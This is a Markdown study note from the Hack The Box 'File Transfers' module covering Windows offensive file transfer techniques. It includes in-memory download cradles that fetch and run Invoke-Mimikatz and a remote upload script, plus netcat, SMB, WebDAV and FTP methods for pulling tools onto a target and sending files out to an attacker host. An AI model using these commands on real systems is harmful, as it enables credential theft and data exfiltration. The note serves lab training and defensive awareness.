---
title: Windows File Transfer Methods
source: Hack The Box
module: File Transfers
tags:
  - htb
  - windows
  - file-transfer
  - powershell
  - lotl
  - pentesting
---
# 🪟 Windows File Transfer Methods

> [!info]+ 📌 Why This Matters
> Windows ships with many **built-in utilities** for file transfer. Understanding them is critical for both sides:
> - 🔴 **Attackers** → move tools/payloads while blending in with legit traffic
> - 🔵 **Defenders** → know what to monitor and how to write detection policies

---

## 🕵️ Case Study — Astaroth APT

> [!example]+ 🎯 "Fileless" Doesn't Mean No Files
> The **Astaroth** attack chained native Windows tools to stay under the radar:
>
> 1. 📧 Spear-phishing email → malicious **LNK file**
> 2. 🔗 LNK → executes **WMIC** with `/Format` → downloads & runs malicious **JavaScript**
> 3. ⬇️ JavaScript abuses **Bitsadmin** → downloads payloads
> 4. 🔓 Payloads are **Base64-encoded** → decoded with **Certutil** → produces **DLLs**
> 5. 💉 **regsvr32** loads a DLL → decrypts more files → final payload injected into `Userinit`

> [!quote]+ 💡 Key Takeaway
> ==Fileless means the payload runs **in memory** — but file transfers still happened.== Multiple LOLBins were chained to bypass defenses.

---

# 📥 Download Operations

> [!abstract]+ 🗺️ Scenario
> We have access to **MS02** (Windows target) and need to pull files from our **Pwnbox** (Linux attacker machine).

---

## 1️⃣ PowerShell Base64 Encode & Decode

> [!tip]+ 🧩 When To Use
> Best when you have a terminal but want to **avoid network communication**. Works great for ==small files==.

**Step 1 — Check MD5 hash on Pwnbox** 🐧

```bash
md5sum id_rsa
```

```text
4e301756a07ded0a2dd6953abf015278  id_rsa
```

**Step 2 — Encode file to Base64** 🐧

```bash
cat id_rsa | base64 -w 0; echo
```

**Step 3 — Decode on Windows target** 🪟

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVO..."))
```

**Step 4 — Verify integrity** ✅

```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

```text
Algorithm   Hash                                   Path
---------   ----                                   ----
MD5         4E301756A07DED0A2DD6953ABF015278       C:\Users\Public\id_rsa
```

> [!warning]+ ⚠️ Limitations
> - `cmd.exe` max string length: ==**8,191 characters**==
> - Web shells may error on extremely large strings
> - ❌ Not practical for large files

---

## 2️⃣ PowerShell Web Downloads

> [!info]+ 🌐 Why HTTP/HTTPS?
> Most companies **allow outbound HTTP/HTTPS** through the firewall for productivity. Defenders may counter with web filtering, file-type blocking, or domain whitelisting.

### 📋 WebClient Methods Cheat Sheet

| Method              | Description                              |
| ------------------- | ---------------------------------------- |
| `OpenRead`          | Returns data as a **Stream**             |
| `OpenReadAsync`     | Stream, without blocking the thread      |
| `DownloadData`      | Downloads and returns a **Byte array**   |
| `DownloadDataAsync` | Byte array, non-blocking                 |
| `DownloadFile`      | Downloads to a **local file** 💾          |
| `DownloadFileAsync` | Local file, non-blocking                 |
| `DownloadString`    | Downloads and returns a **String** 📄     |
| `DownloadStringAsync`| String, non-blocking                    |

### 💾 DownloadFile Method

```powershell
# Syntax: (New-Object Net.WebClient).DownloadFile('<URL>','<Output Path>')
(New-Object Net.WebClient).DownloadFile('http://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

```powershell
# Async version
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

### 👻 DownloadString — Fileless (In-Memory)

> [!danger]+ 🔥 Fileless Execution
> Script runs **directly in memory** — nothing touches disk! Uses `Invoke-Expression` (alias `IEX`).

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

```powershell
# Pipeline version — same result
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### 🌍 Invoke-WebRequest (PowerShell 3.0+)

> [!note]+ 📝 Aliases: `iwr` · `curl` · `wget`
> ⚠️ Noticeably **slower** than WebClient at downloading files.

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

> [!tip]+ 📚 Extra Resource
> **Harmj0y** compiled an extensive list of PowerShell download cradles — learn their nuances (proxy awareness, disk vs memory) to pick the right one per situation.

### 🚨 Common Errors & Fixes

> [!bug]+ ❌ Error 1 — IE First-Launch Not Complete
> ```text
> The response content cannot be parsed because the Internet Explorer engine
> is not available, or Internet Explorer's first-launch configuration is not
> complete. Specify the UseBasicParsing parameter and try again.
> ```
>
> **✅ Fix:**
> ```powershell
> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
> ```

> [!bug]+ ❌ Error 2 — SSL/TLS Certificate Not Trusted
> ```text
> The underlying connection was closed: Could not establish trust
> relationship for the SSL/TLS secure channel.
> ```
>
> **✅ Fix:**
> ```powershell
> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
> ```

---

## 3️⃣ SMB Downloads

> [!info]+ 📂 SMB Protocol
> **Server Message Block** runs on ==TCP/445==. Very common in enterprise networks with Windows services.

**Step 1 — Start SMB server on Pwnbox** 🐧

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

**Step 2 — Copy file on Windows** 🪟

```cmd
copy \\192.168.220.133\share\nc.exe
```

```text
        1 file(s) copied.
```

> [!warning]+ 🚫 Guest Access Blocked (Modern Windows)
> ```text
> You can't access this shared folder because your organization's
> security policies block unauthenticated guest access.
> ```

**✅ Fix — Add authentication:**

```bash
# Pwnbox — server with credentials
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
# Windows — mount the share
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

```text
The command completed successfully.
        1 file(s) copied.
```

> [!note]+ 💡 Pro Tip
> Mounting with `net use` also helps if you get an error using `copy filename \\IP\sharename` directly.

---

## 4️⃣ FTP Downloads

> [!info]+ 📡 FTP Protocol
> **File Transfer Protocol** uses ==TCP/21== (control) and ==TCP/20== (data).

**Step 1 — Install & start FTP server on Pwnbox** 🐧

```bash
sudo pip3 install pyftpdlib
```

```bash
# Default port is 2121 — specify 21. Anonymous auth is ON by default.
sudo python3 -m pyftpdlib --port 21
```

**Step 2a — Download via PowerShell** 🪟

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

**Step 2b — Download via FTP command file (non-interactive shells)** 🪟

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

```cmd
more file.txt
```

> [!success]+ ✅ Verify
> ```text
> This is a test file
> ```

---

# 📤 Upload Operations

> [!abstract]+ 🗺️ Use Cases
> Exfiltration · password cracking · analysis — same methods as downloads, just **reversed**.

---

## 1️⃣ PowerShell Base64 Encode & Decode

**Step 1 — Encode on Windows** 🪟

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

```powershell
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

```text
Hash
----
3688374325B992DEF12793500307566D
```

**Step 2 — Decode on Pwnbox** 🐧

```bash
echo <base64_string> | base64 -d > hosts
```

```bash
md5sum hosts
```

> [!success]+ ✅ Hashes Match
> ```text
> 3688374325b992def12793500307566d  hosts
> ```

---

## 2️⃣ PowerShell Web Uploads

> [!note]+ 📝 No Built-In Upload Cmdlet
> PowerShell has no native upload function — we build one with `Invoke-WebRequest` / `Invoke-RestMethod`, plus a web server that **accepts uploads**.

**Step 1 — Install & start upload server on Pwnbox** 🐧

```bash
pip3 install uploadserver
```

```bash
python3 -m uploadserver
```

```text
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Step 2 — Upload using PSUpload.ps1** 🪟

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

```powershell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

> [!success]+ ✅ Result
> ```text
> [+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
> [+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
> ```

### 🥷 Base64 Web Upload (via Netcat)

**Step 1 — Send Base64 as POST request** 🪟

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

**Step 2 — Catch with Netcat** 🐧

```bash
nc -lvnp 8000
```

```text
listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
...
IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMg...
```

**Step 3 — Decode** 🐧

```bash
echo <base64> | base64 -d -w 0 > hosts
```

---

## 3️⃣ SMB Uploads (via WebDAV)

> [!warning]+ 🚫 SMB Usually Blocked Outbound
> Enterprises rarely allow ==TCP/445== out of the internal network. **WebDAV** to the rescue — SMB over ==HTTP/HTTPS==! If SMB fails, Windows **falls back to HTTP** automatically.

> [!info]+ 📚 What is WebDAV?
> **WebDAV** (RFC 4918) is an HTTP extension that lets a web server behave like a **file server**. Supports HTTPS too.

**Step 1 — Install WebDAV modules on Pwnbox** 🐧

```bash
sudo pip3 install wsgidav cheroot
```

**Step 2 — Start WebDAV server** 🐧

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

**Step 3 — Connect from Windows** 🪟

```cmd
dir \\192.168.49.128\DavWWWRoot
```

```text
 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
```

> [!tip]+ 💡 What is `DavWWWRoot`?
> A ==special keyword== recognized by the Windows Shell — **no such folder exists** on the server. It tells the Mini-Redirector driver to connect to the WebDAV **root**.
>
> ✅ You can skip it by using a real folder: `\\192.168.49.128\sharefolder`

**Step 4 — Upload files** 🪟

```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

> [!note]+ 📝 No Restrictions?
> If ==TCP/445== is allowed outbound, just use `impacket-smbserver` the same way as in download operations.

---

## 4️⃣ FTP Uploads

**Step 1 — Start FTP server with `--write`** 🐧

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

> [!warning]+ ⚠️ 
> ```text
> RuntimeWarning: write permissions assigned to anonymous user.
> ```

**Step 2a — Upload via PowerShell** 🪟

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

**Step 2b — Upload via FTP command file** 🪟

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

# 🧠 Recap

> [!summary]+ 📊 Methods Overview
>
> | Method | Protocol / Port | Download | Upload | Notes |
> | ------ | --------------- | :------: | :----: | ----- |
> | 🔤 Base64 | None (copy/paste) | ✅ | ✅ | Small files only (8,191 char limit) |
> | 🌐 PowerShell WebClient | HTTP/S · FTP | ✅ | ✅ | `DownloadString` = fileless 👻 |
> | 🌍 Invoke-WebRequest | HTTP/S | ✅ | ✅ | Slower · may need `-UseBasicParsing` |
> | 📂 SMB | TCP/445 | ✅ | ✅ | Guest access often blocked |
> | 📁 WebDAV | HTTP/S (80/443) | ✅ | ✅ | Great SMB alternative outbound |
> | 📡 FTP | TCP/21 (+20) | ✅ | ✅ | `--write` needed for uploads |

---

> [!quote]+ 🏁 Final Thought
> ==Every native tool on a system is a potential file transfer vector.== Master them all — offense and defense are two sides of the same coin.
````````